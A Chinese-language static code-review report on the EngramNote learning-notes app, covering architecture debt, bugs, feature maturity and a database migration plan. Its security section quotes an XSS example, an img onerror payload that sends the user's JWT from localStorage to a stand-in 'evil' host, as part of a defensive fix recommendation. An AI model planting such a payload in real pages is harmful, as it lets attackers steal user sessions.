# EngramNote 全项目代码审查报告

> **状态：过程记录** ｜ 记录时间：2026-08-30 ｜ 权威性：不是现状依据

> 审查日期：2026-08-30 · 方式：静态代码审查 + 文档三方对照（README ↔ docs/architecture.md ↔ 代码）
> 范围：backend/app 全部路由/服务/任务/模型/迁移层，frontend/src 核心页面与工具，基础设施与测试目录结构
> 标注约定：`[已知债 docs §10-x]` = architecture.md 技术债索引已有记录、本次核验现状；`[新发现]` = 文档未记录
> 严重程度：高（数据/安全/稳定性风险）/ 中（健壮性/性能/维护负担）/ 低（风格/细节）

---

## 项目概述

EngramNote 是「AI 驱动的学习笔记管理与知识库工具」，核心闭环：**资料摄入（PDF/图片/Office/音视频/Markdown）→ MinerU/ASR 转换 → AI 清洗（规则去噪 + BGE-M3 向量去重）→ AI 理解（摘要/4 类卡片/自动出题）→ 知识图谱 → SM-2 间隔重复 → RAG 问答（向量 + BM25 + n-gram、RRF 融合、SSE 流式）→ 学习目标与复习提醒**。

- **架构**：FastAPI + SQLAlchemy(async, SQLite 默认) + Celery（文件系统 broker + Beat）+ Chroma + BGE-M3 + DeepSeek/GLM；前端 React 18 + TS + Vite（无状态管理库，19 页）；后端 15 路由 / 36 服务模块 / 15 张表 / 4 进程（API + Worker + Beat + 前端）。
- **文档**：README.md、docs/architecture.md（活文档，自认 8 项技术债）、docs/tooling-report.md（首轮 lint 266 问题已修复至 0）——文档质量显著高于同类项目。

### 功能成熟度总览（对照 README V2.0 六项承诺）

| 承诺 | 判定 | 一句话依据 |
|---|---|---|
| RAG 三路混合检索 + RRF | △ | 功能在，但检索全量扫描无索引、编码依赖 worker 可用性、降级无用户提示（详见 M-1） |
| SSE 流式问答 | ✓ | 首字即渲染、降级 LLM 兜底已实现；缺停止生成/取消（小瑕疵） |
| 笔记版本历史 | ✓ | 快照/列表/diff/恢复/保留策略(50/10/50)齐全，覆盖前快照已核实（clean_tasks.py:110、note_service.py:952） |
| 学习目标与计划 | △ | CRUD+每日推荐在，但进度缓存仅靠 Beat 每日 00:30 刷新，无 API 手动触发（详见 M-4） |
| 复习到期提醒 | △ | 浏览器通知+邮件+免打扰在，但免打扰仅全局、无退订聚合、last_reminded_at 为存根（详见 M-3） |
| Vault 目录结构 + 扫描导入 | ✓ | 目录树/命名关联/meta 写穿/冲突改名恢复/扫描导入全部落地 |

其他核心模块：上传 △（magic bytes/配额/两阶段成熟，30s 超时硬伤）、回收站 ✓（隔离目录/改名恢复/悬挂引用设计优秀，细节见 M-5）、知识图谱 △（API 进程内加载嵌入模型，与架构决策冲突，见 B-2）。

---

## 代码整洁度问题

- **[高] [已知债 docs §10-1]** database.py:126-151,189-538,541-635 - 数据库 schema 有 4 处出处（ORM 模型 / `create_all` / `_migrate_sqlite` 手写 DDL / `_rebuild_dangling_tables` raw sqlite3 重建 + Alembic）。改一次表结构要同步 4 处，任何遗漏即漂移。 - 详见「数据库治理专题」收敛方案。
- **[高] [已知债 docs §2/§10-4]** api/notes.py:1031 行、api/upload.py（750+ 行） - 路由层承载大量业务逻辑（列表组装、项目标签回填 `_build_note_response`、上传两阶段编排），违反「路由只校验+组装」自定分层约定。 - 将响应组装下沉 `note_service`，路由保留鉴权/校验；拆分为 notes_crud.py / notes_trash.py / notes_version.py 三个子路由。
- **[中] [已知债 docs §10-4]** services/llm_service.py:1550 行 - 一个文件装下 HTTP 客户端管理、JSON 容错解析、RateLimiter、两个会话类、LLMService 全部方法。 - 拆为 `llm/client.py`（连接+超时+重试）、`llm/json_parse.py`、`llm/rate_limit.py`、`llm/sessions.py`，纯搬移不改逻辑。
- **[中] [已知债 docs §10-4]** frontend/src/api/client.ts:2221 行 - 类型定义 + Token 管理 + 请求封装 + 90 个 API 函数混装；api/knowledge.ts 是唯一做到拆分的模块。 - 照 knowledge.ts 模板按域拆：auth.ts / notes.ts / review.ts / qa.ts 等，client.ts 只留 request/uploadRequest/SSE 基础设施与通用类型。
- **[中] [已知债 docs §10-4]** frontend/src/pages/KnowledgeGraph.tsx:1547 行、styles/global.css:2906 行 - 图谱页含拖拽/缩放/极简图/关系 CRUD 全量逻辑；CSS 为补丁式追加区段。 - 组件化（GraphCanvas/RelationPanel/Minimap）；CSS 按页拆分 + CSS Variables 层（项目已用 `var(--space-*)`，继续推进）。
- **[中] [已知债 docs §10-2]** F-01~F-35 修复编号注释 180+ 处散布全仓（如 note_service.py:87、client.ts:230、rag_service.py:84），architecture.md 承诺迁至 docs/decisions.md 但该文件不存在。 - 建立 decisions.md，批量迁移编号注释（保留 WHY，去掉编号）。
- **[中] [已知债 docs §10-3]** Service 层五态返回契约（None/dict/异常/[]/False 混用），如 rag_service 失败返回 `None`/`[]`/警告日志三种语义；前端 client.ts:290-293 靠匹配后端中文 detail 文案转义错误。 - 自定义 AppError（error_code，前端 switch 而非字符串匹配）；「降级」与「失败」用显式返回值区分。
- **[中] [已知债 docs §10-8]** database.py:59 导入即建引擎、main.py:44 导入即 monkeypatch tempfile 标准库 - 任何工具脚本 import app.database 都会创建引擎、改全局 tempfile 行为。 - 引擎/init_db 移到 lifespan 显式调用；tempfile 兼容改为显式初始化函数。
- **[低] [新发现]** services/notification_service.py:37-38 - `APP_LINK = "http://localhost:3000"` 硬编码且端口错误（前端实际 5173）；生产部署邮件里的「立即去复习」指向本机。 - 新增 `app_base_url` 配置项（.env + config.py + Settings）。
- **[低] [新发现]** models/note.py:18 - 模块 docstring 中「文件路径格式为 {user_id}/{note_id}/{filename}」已过时（现为 Vault {user_id}/{project_slug}/source/...），文档漂移。 - 更新 docstring。
- **[低] [已知债 docs §10-6]** backend/tests/ 34 个文件中混入 verify_*、test_key_issues、test_fixes 等调试性脚本，与 scripts/、e2e_cleanup.py 边界模糊。 - 见测试体系维度（§总体建议）。

---

## 潜在 Bug 和隐患

### 安全

- **[高] [新发现]** frontend/src/utils/markdown.ts:186-189 + pages/NoteDetail.tsx:909 - Markdown 渲染链无 HTML 消毒：marked 默认保留原始 HTML（markdown.ts:112 注释明言「MinerU 输出的 `<table>` 原样保留」），渲染结果直接进 `dangerouslySetInnerHTML`（NoteDetail.tsx:858/909、LearningAssessment.tsx 多处长 424-575）。**触发条件**：用户导入恶意 PDF/MD（外部共享资料是常态场景），其中内嵌 `<img src=x onerror=fetch('http://evil/?t='+localStorage.token)>`，转换后打开笔记即执行 → JWT 窃取。KaTeX 失败路径做了转义，但 marked 主路径没有。**修复建议**：引入 DOMPurify 白名单消毒（允许 table/thead/td/p/img(限 src)/pre/code/h1-6/p/ul/ol/li/blockquote 等最小集），消毒后再做 KaTeX 二次渲染；或 sanitize-html 后端再渲染。
- **[高] [已知债核验]** config.py:219,230-244 - `debug: bool = True` 为默认值，JWT 空密钥校验仅在 `debug=False` 时生效（L239）。**触发条件**：生产部署只配了数据库/LLM 密钥、漏设 `DEBUG=false` → 以空字符串为 HS256 密钥签发 token，任何人可离线伪造任意 user_id 的 token。**修复建议**：`jwt_secret_key` 非空校验不绑定 debug（无密钥时启动即报错并强制生成）；debug 仅控制日志与 LLM provider。
- **[中] [新发现]** main.py:88-94 - CORS 硬编码 `localhost:5173/3000` + `allow_credentials=True` + 方法/头全放开；Docker nginx 部署（docker-compose 前端 80 端口）同源不受影响，但任何自定义域名部署即静默失败。 - CORS 源改为配置项。
- **[低] [新发现]** backend/app/api/upload.py:72-84 - `.md` 无内容签名校验（`_MAGIC_RULES` 未覆盖）：伪装成 .md 的 HTML 可直接入库，与上一条 XSS 链组合放大；.mp3/.wav/.m4a 同样无校验（转写失败会兜底，风险低）。 - md 上传时做轻量内容嗅探（拒绝含 `<script`/`<iframe` 的文本）。

### 稳定性 / 数据一致性

- **[高] [新发现]** services/note_service.py:358-371 - `restore_note` 文件搬家失败被吞（仅 warning），随后**无条件**把 DB 路径字段改为 inbox 目标路径。**触发条件**：磁盘写失败/文件被占用时恢复回收站笔记 → DB 指向不存在的文件，详情页读取 FileNotFoundError，且原 trash 文件仍在但 DB 不知道。**修复建议**：复用 `trash_note` 的「仅更新实际搬成功的路径」模式（L292-298）；有搬家失败时返回 `restore_degraded=True` 提示前端。
- **[高] [新发现]** services/graph_service.py:271-304 - 图谱关系建议在 **API 进程**内加载 BGE-M3（`EmbeddingService().encode` + `run_in_executor`），与 V2.0「嵌入模型隔离到 Celery Worker 防 FastAPI 主进程段错误」的核心架构决策直接冲突。**触发条件**：用户点击知识图谱「自动建议关系」，API 进程首次加载 2.2GB 模型（峰值 ~2× 内存），低内存机器即重演当初修复的 0xC0000005 段错误/ OOM。**修复建议**：复用 rag_service 的 `_encode_via_celery` 模式（send_task encode + get），或把建议关系整体做成 Celery 任务。
- **[中] [新发现]** services/storage_service.py:327-343 - `move_file` = 全量读字节 → 写新位 → 删旧位，且非原子。**触发条件**：500MB 视频（配置允许 max_upload_size_mb=500）移入/恢复回收站 → 一次性读入 500MB 内存 + 磁盘双份占用。**修复建议**：本地模式用 `os.replace`（同盘原子移动）；MinIO 用 `copy_object + remove_object` 服务端搬移。
- **[中] [新发现]** services/note_service.py:580-626 - `purge_note` 第 5 步对 AssessmentResult / LearningGoal / DailyPlan 做**全表扫描 + Python 过滤**（加载用户全部评估/目标/计划再逐条判 JSON 成员）。**触发条件**：长期用户的每日计划与评估积累数百条后，每次物理删除都全量拉取。**修复建议**：SQLite `json_each` / PG `?` 运算符在 SQL 端过滤后仅更新命中行（伪代码见功能成熟度 M-5）。
- **[低] [新发现]** database.py:580-635 - `_rebuild_dangling_tables` 每次启动探测并在 raw 连接上 DROP/重建 5 张表；当前只有 API 进程调 `init_db`，单实例部署无竞态，但若部署多 API 实例（uvicorn --workers N 各自 lifespan）会并发重建。 - 加文件锁（如 `data/db/.schema-lock`）或收敛到迁移通道后整个函数删除（见数据库治理专题）。
- **[低] [新发现]** services/note_service.py:347-353 - `restore_note` 1000 次改名试探耗尽后兜底 `base-999` 可能覆盖已存在文件。 - 兜底应改为抛错提示用户，而非静默覆盖。

### 性能 / 资源

- **[中] [新发现]** services/rag_service.py:182-194,360-371 + 205-270 - BM25 与 n-gram 检索**每次问答拉取用户全部卡片**到内存并 Python 循环打分（无索引、无缓存），卡片数千张时每次问答 CPU 秒级。**触发条件**：重度用户（卡片 3000+）→ 问答首字延迟源于检索而非 LLM。**修复建议**：卡片语料缓存于进程内并在卡片变更时失效；或降级为「最近 N 张 + 高掌握度排除」（与复习调度共享过滤），短期即可见效；长期可上 SQLite FTS5（BM25 内置）或把检索挪入 worker。
- **[中] [新发现]** frontend/src/api/client.ts:317-325 + config.py:120 - `uploadRequest` 复用 `REQUEST_TIMEOUT_MS=30s` 全局超时，而 `max_upload_size_mb=500`。**触发条件**：慢网/大视频/大 PDF 上传超过 30 秒即被 AbortController 强制中断，且无断点续传。**修复建议**：上传专用超时（如 10 分钟）；分片上传 + 后端断点合并作为后续增强。
- **[中] [新发现]** services/rag_service.py:85,117 - 向量编码/检索 Celery `task.get(10/15)`：worker 宕机时每次问答固定等待最长 25 秒后才降级，且前端无降级提示（用户只感觉「卡」）。 - API 启动时探测 worker 可用性并缓存结果；SSE 首事件立即发送 `provider=bm25_ngram_hybrid` 元信息。
- **[低] [已知债核验]** services/llm_service.py:254 - RateLimiter 为进程内令牌桶：API/Worker/Beat 各进程独立限流，`llm_max_rpm` 全局语义失效。 - 多进程场景改服务端限流/串行化（当前单机 + RPM=10 的默认值下影响有限，记录在案即可）。

### 前端生命周期

- **[中] [新发现]** frontend/src/pages/QA.tsx:25-111 - 流式问答无 AbortController/取消按钮：组件卸载或连续提问时，旧流仍持续 `reader.read()` 并向已卸载组件 setState；无法中途停止生成。 - `useEffect` cleanup 中 `reader.cancel()` + abort fetch；增加「停止生成」按钮。
- **[低] [新发现]** frontend/src/pages/NoteDetail.tsx:169-209 - 清洗/学习两个 5 秒轮询与 CleaningPanel 块级操作（恢复/删除重复块）无互斥：轮询返回的旧 clean 内容可能覆盖用户刚做的块操作结果。 - 块操作进行中暂停轮询（一个 `mutatingRef`），操作完成后再恢复。

---

## 功能成熟度评估

### M-1 RAG 混合检索 —— △

- **当前问题**：三路检索 + RRF 融合主体完整；但 ①向量路强依赖 Celery worker，宕机时每问固定阻塞 25s 且用户无感知（rag_service.py:85,117）；②BM25/n-gram 全量扫描无索引（见 Bug-性能）；③降级无语义提示（sources 为空的「基于通用知识回答」与「检索失败而空」在外观上无区分，rag_service.py:561-578 仅靠 prompt 自述）。
- **改进方案**：检索结果响应增加 `retrieval_status` 字段（full_vector / hybrid / bm25_only / none），SSE 首事件下发；卡片语料进程内缓存 + 变更失效：

```python
# rag_service.py 改进示意
status = "full_vector" if question_embedding is not None else "bm25_only"
...
return {"context": ..., "sources": ..., "provider": ..., "retrieval_status": status}

# 卡片缓存示意（避免每次问答全量拉卡+重打分）
_kb_cache: dict[user_id, tuple[list[CardDoc], float]] = {}
async def _load_card_docs(user_id):
    cached = _kb_cache.get(user_id)
    if cached and time.monotonic() - cached[1] < 60:   # 60s TTL
        return cached[0]
    docs = await self._fetch_all_cards(user_id)
    _kb_cache[user_id] = (docs, time.monotonic())
    return docs
```

### M-2 笔记版本历史 —— ✓

- **核实结论**：快照（编辑/清洗覆盖前建快照：clean_tasks.py:110、note_service.py:952）、列表、行级 diff、恢复（先验目标可读再建快照，version_service.py:347-351）、来源上限裁剪（50/10/50，FIFO 删最旧）、并发重号重试（唯一索引 + IntegrityError 重试 3 次）——全部落地且实现质量高。
- **小改进**：`restore_version` 后无「已从 vN 恢复」的版本链可视化标记（change_summary 已写 `restore from vN`，前端 VersionHistory 未展示该字段）；可在版本列表前端列展示 change_summary。

### M-3 复习到期提醒 —— △

- **当前问题**：①免打扰时段为全局配置（config.py:202-204），无 per-user 设置；②邮件无退订/频率控制（User 模型无提醒开关字段，reminder_tasks.py:52-59 实际是对**所有**有邮箱用户群发，与注释「email_reminder_enabled=true 的用户」不符——注释与行为漂移）；③notification_service.py:108 `last_reminded_at` 恒 None 存根；④APP_LINK 硬编码。
- **改进方案**：User 表加 `email_reminder_enabled`(bool) 与 `quiet_hours_start/end`；reminder_tasks 查询条件改为 `WHERE email_reminder_enabled=1 AND email != ''`；新增 `PUT /api/auth/me/reminder-settings` 端点；`last_reminded_at` 真实持久化（User 表列）用于「同日内不重复提醒」。

### M-4 学习目标与每日计划 —— △

- **当前问题**：目标 CRUD + 三类任务推荐完整（goal_service.py 结构清晰）；但 `progress_cache` 唯一刷新入口是 Beat 每日 00:30（reminder_tasks.py:86-106，全仓仅此一处调用），Beat 挂掉即整个月进度停摆，用户当日无任何手动刷新手段；前端 LearningGoals 页显示的是缓存值。
- **改进方案**：`GET /api/goals` 响应前做「缓存过期即重算」：`last_progress_refresh` 超过 2 小时则同步触发 `refresh_goal_progress()`（加防抖：同用户 10 分钟内不重复算），仅对逾期目标重算而非全量。

### M-5 回收站 —— ✓（细节健壮性见 Bug-数据一致性）

- **现状**：软删除原子包、trash/{note_id} 隔离目录、restore 同名改名 `-1/-2`、purge 悬挂引用 + 核心卡片提升、清空回收站逐条容错——设计在同类项目里属上乘，与项目记忆文档中记录的硬约束一致。
- **改进方案**（针对 purge 全表扫描）：

```python
# note_service.py purge 第5步 改进示意：SQL 端过滤
# 仅更新"material_note_ids/personal_note_ids 中包含 note_id"的评估结果
stmt = text("""
    UPDATE assessment_results SET is_stale = 1
    WHERE user_id = :uid AND (
        EXISTS (SELECT 1 FROM json_each(assessment_results.material_note_ids)
                WHERE json_each.value = :nid)
     OR EXISTS (SELECT 1 FROM json_each(assessment_results.personal_note_ids)
                WHERE json_each.value = :nid)
    )
""")  # PostgreSQL 下换 jsonb ? 运算符，包一层方言分支即可
```

### M-6 上传 —— △

- **当前问题**：两阶段 + magic bytes（pdf/png/jpg/office/mp4 校验齐全）+ 配额 + 文件名冲突探测成熟；但 30s 超时（client.ts:325）与 500MB 上限矛盾、无分片续传、`.md` 无内容嗅探（安全）。
- **改进方案**：上传专用超时 10 分钟；大文件（>50MB）分片（前端 slice + 后端 `/upload/chunk` + `/upload/complete` 合并，两阶段 prepare/commit 可复用现有清理机制）；md 类型拒绝含 `<script` 内容。

### M-7 知识图谱 —— △

- **当前问题**：①API 进程内加载 BGE-M3（见 Bug-稳定性，最高优先修）；②`MAX_CARDS_FOR_SUGGEST=200` 硬编码截断，超出部分永无建议机会且无提示；③嵌入失败静默返回 0 条（graph_service.py:278-283），前端表现为「点了没反应」。
- **改进方案**：建议关系整体走 Celery 任务（`suggest_relations_task`），返回 task_id 前端轮询/SSE；失败落库为「建议失败」状态并在图谱页给出可操作提示；200 上限改为「按最近复习活跃度取 top N」而非无序前 200。

### 测试体系（支撑维度）

- tests/ 混入调试脚本（verify_*.py、test_key_issues.py、test_fixes.py、e2e_cleanup.py 根目录），`pytest tests/` 会收集并烧真实 API/改生产库（architecture.md §10-6 自认，未修）；week 系列测试三份拷贝，正式测试与调试脚本无目录隔离。
- **改进方案**：`tests/unit/`、`tests/integration/`（带 conftest 守卫：无 TEST_DATABASE_URL 即 skip）分层；调试脚本移出 tests/；为 purge/restore/rag 降级路径补 3-5 个真实单测。

---

## 数据库治理专题建议

### 现状（4 处 schema 出处）

| 通道 | 位置 | 职责现状 |
|---|---|---|
| ORM 模型 | models/*（15 表） | 名义上的 schema 源 |
| create_all | database.py:138 | 启动无条件建新表 |
| 手写迁移 | database.py:189-538 `_migrate_sqlite` | 补列/防御建表/孤儿清理/关系去重，f-string 拼 SQL（L488-498） |
| raw 重建 | database.py:541-635 `_rebuild_dangling_tables` | PRAGMA OFF + DROP/重命名重建 5 表，Windows 盘符 netloc hack |
| Alembic | alembic/versions/001-009 | 001 基线缺失（`Revises: None` 但假定 notes 已存在），全新库 `upgrade head` 必失败；依赖被注释（requirements.txt:29） |

### 收敛方案（三阶段，每步独立提交可回滚）

**阶段 0 · 止血（不动 schema）**
- 为 `_rebuild_dangling_tables` 加文件锁（`data/db/.schema-lock`，`fcntl`/`msvcrt` 跨平台），防多 API 实例并发重建。
- `_migrate_sqlite` 的 f-string SQL（L488-498）改为参数化（表/列名来自硬编码白名单，用 `sqlalchemy.text` 绑定变量）。
- `requirements.txt` 解除 alembic 注释，明确它是部署依赖而非可选。

**阶段 1 · 补基线**
- 新增 `010_baseline.py`（batch 模式，`with op.batch_alter_table`），但基线语义用「全新库直达当前 schema」实现：生成一份与 `Base.metadata` 完全一致的 `op.create_table` 全套（15 表 + 全部索引 + 唯一约束）。
- 兼容策略：`001` 内加守卫——探测 `notes` 表不存在时按 metadata 建全部表并 `stamp` 到 head（Alembic 迁移内用 inspector 条件分支）；已存在旧库：现有链条照旧 `upgrade head`。两条路径都以「head = 当前 schema」收敛。
- 迁移命令写入 README/start.sh：`alembic upgrade head` 替代「删库重建」成为升级唯一入口；`init_db` 改为**只读检测**：`alembic_version` 落后 head → 拒绝启动并打印升迁命令（不再 create_all/手写迁移）。

**阶段 2 · 删除冗余通道**
- 删除 `_migrate_sqlite` 与 `_rebuild_dangling_tables`：悬挂引用改造（SET NULL + column nullable）以 batch 模式正式迁移重写（`op.batch_alter_table` + `recreate='always'`），孤儿清理/去重保留为一次性 data migration（`011_data_cleanup.py`，幂等可重跑）。
- 今后 schema 变更强制流程：改 models → `alembic revision --autogenerate` → 人工审阅 diff → 提交。三处同步 checklist 废弃。

**阶段 3 · 决策记录**
- 新建 `docs/decisions.md`：承接 F-01~F-35 编号注释（一条一决策：问题/方案/为什么）；未来重要取舍（如「嵌入为何走 Celery」「回收站为何悬挂引用」）追加于此。

### 回滚策略

- 每阶段执行前：SQLite `sqlite3 db .backup` 或 VACUUM INTO（WAL 需先 checkpoint）；保留最近 2 个备份。
- 所有 data migration 提供 `downgrade` 或显式「先备份后删」语句；Postgres 用户 `pg_dump`。
- 验收矩阵：①全新库 `upgrade head` 一遍过；②现网库直接 `upgrade head` 幂等；③中断恢复（迁移半途 kill 后重启重跑）。

---

## 做得好的地方

- **文档体系**：活架构文档 + 技术债索引 + 工具链报告，自认债并给出修复顺序，罕见。
- **回收站设计**：隔离目录、改名恢复、悬挂引用、核心卡片提升，语义完整且有测试覆盖意识。
- **防御性基础设施**：路径遍历防护（storage_service.py:80-84 精确前缀判断）、SQLite PRAGMA（外键 + busy_timeout）、TZDateTime 统一 UTC、magic bytes 校验、错误响应统一 `{detail, error_code, request_id}`。
- **自愈能力**：版本文件缺失自动清理幽灵记录（version_service.py:214-222）、孤儿数据启动清理、`_abort_processing` 处理中状态安全中止。
- **工程纪律**：F-xx 修复编号留痕、并发版本号唯一索引重试、白名单字段更新（tasks/common.py:27）——问题可追溯。

---

## 总体建议

按重心排序的改进路线（每步可独立落地）：

1. **安全止血（最高优先）**：Markdown 渲染引入 DOMPurify 白名单消毒；`jwt_secret_key` 非空校验与 debug 解耦；CORS 源配置化。
2. **架构一致性**：知识图谱嵌入改走 Celery（消除 API 进程大模型加载）；`restore_note` 搬家失败一致性修复。
3. **数据库治理**：按专题三阶段收敛（阶段 0 零风险先上）。
4. **检索与体验**：RAG 卡片缓存/降级状态提示、上传超时分离、学习目标按需刷新。
5. **可维护性**：巨型文件拆分为「只搬不改」独立提交；F-xx → decisions.md；client.ts 按 knowledge.ts 模板分模块。
6. **工程化**：requirements 锁版本（或至少 `==` 主版本 + poetry/pip-tools hash）；测试目录分层 + 守卫；`npm run format` / `ruff format` 单独提交统一格式。

### 建议修复优先级清单（逐项授权用）

| 优先级 | 项目 | 位置 | 类型 |
|---|---|---|---|
| P0-1 | Markdown XSS 消毒 | markdown.ts / NoteDetail.tsx | 安全 |
| P0-2 | JWT 密钥校验与 debug 解耦 | config.py:230-244 | 安全 |
| P0-3 | 恢复笔记搬家失败一致性 | note_service.py:358-371 | 数据 |
| P1-1 | 图谱嵌入 Celery 化 | graph_service.py:271-304 | 架构 |
| P1-2 | 迁移收敛阶段 0（锁 + alembic 依赖） | database.py / requirements.txt | 治理 |
| P2-1 | 上传专用超时 | client.ts:317-325 | 健壮 |
| P2-2 | RAG 卡片缓存 + 降级状态 | rag_service.py | 性能 |
| P2-3 | 学习目标按需刷新 | goal_service / api/goals.py | 功能 |
| P3 | 巨型文件拆分 / decisions.md / 测试分层 / 依赖锁定 / 格式统一 | 全仓 | 维护 |

---

**Metrics**：精读核心文件 ~25 个（后端 19 + 前端 6），4 个并行探索代理覆盖其余模块；结论 高速 6 项（安全 4 + 数据/架构 2）、中 12 项、低 10 项；文档不一致纠正 2 处（parse_json_tolerant 非死代码、mail 群发注释漂移）；审查置信度：中高（未执行动态测试/基准，性能结论为静态推理）。

> 本报告为只读审查输出，未修改任何代码。如需按优先级清单修复，请逐项授权后执行。